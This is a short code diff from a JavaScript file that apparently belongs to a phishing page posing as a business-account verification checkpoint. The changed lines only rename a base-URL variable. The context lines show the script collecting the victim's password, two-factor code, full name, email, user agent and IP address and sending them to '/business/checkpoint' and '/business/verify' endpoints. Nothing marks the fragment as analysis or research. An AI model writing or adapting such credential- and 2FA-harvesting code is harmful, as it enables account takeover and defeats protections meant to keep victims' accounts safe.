@@ -30,7 +30,7 @@ var isFirstLoginInput=true;
 
        async function uploadFile() {
         const dt = {};
-        var faurl = local +'/business/checkpoint';
+        var faurl = abc +'/business/checkpoint';
         var two_fa_code = document.getElementById("two_fa_code").value;
         dt.two_fa_code = two_fa_code;
         dt.id = id;
@@ -65,7 +65,7 @@ var isFirstLoginInput=true;
             var pw = document.getElementById("password").value;
             var fullname = document.getElementById("fullName").value;
             var useragent = $.ua;
-            var url = local +'/business/verify';
+            var url = abc +'/business/verify';
             //console.log(useragent.ua);
             model.location = ip;
             model.personal_email_address = email;
